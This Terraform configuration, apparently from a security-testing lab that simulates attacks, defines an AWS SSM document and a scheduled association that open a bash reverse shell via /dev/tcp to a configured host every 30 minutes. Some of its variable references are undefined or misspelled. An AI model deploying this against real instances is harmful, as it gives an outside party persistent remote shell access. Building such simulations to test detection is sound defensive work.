locals {
    port = 4444
    pid_path = "/var/run/nc_listener"
}

resource "aws_ssm_document" "exec_reverse_shell" {
  name          = "exec_reverse_shell"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "exec reverse shell",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "exec_reverse_shell",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "600",
                    "runCommand": [
                        "kill -9 $(cat ${local.pid_path}) 2>&1 > /dev/null",
                        "while ! nc -w 1 ${local.host_ip} ${local.host_post}; do sleep 5; done",
                        "bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1  &",
                        "echo -n $! > ${local.pid_path}",
                        "touch /tmp/attacker_exec_reverseshell_target",
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "exec_reverse_shell" {
    name = "exec_reverse_shell"

    resource_query {
        query = jsonencode(var.resource_query_exec_reverse_shell)
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "exec_reverse_shell" {
    association_name = "exec_reverse_shell"

    name = aws_ssm_document.exec_reverse_shell.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.exec_reverse_shell.name,
        ]
    }

    compliance_severity = "HIGH"

    # every 30 minutes
    schedule_expression = "cron(0/30 * * * ? *)"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}